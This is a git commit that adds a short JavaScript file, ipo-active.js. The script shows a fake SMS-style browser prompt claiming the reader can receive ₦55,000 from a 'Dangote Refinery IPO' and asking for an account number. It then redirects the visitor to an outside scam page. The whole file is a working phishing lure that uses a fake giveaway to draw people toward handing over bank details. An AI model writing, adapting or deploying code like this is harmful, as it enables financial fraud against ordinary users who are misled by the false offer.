0a589d4348a83e66fa7d6229c9a6a3280441f4a8
help0z <triplerain29@gmail.com>
2026-09-15 06:07:53 +0100

    Create ipo-active.js

---
+++ ipo-active.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW ₦55,000'
+password=prompt('SMS: Congratulations, you are eligible to receive ₦55,000 From Dangote Refinery IPO, click OK to Enter Your Acc. Number','WITHDRAW ₦55,000');
+if (password != 'WITHDRAW ₦55,000') {
+location.href='https://gmoni.info/55000-IPO-offer.html';
+}
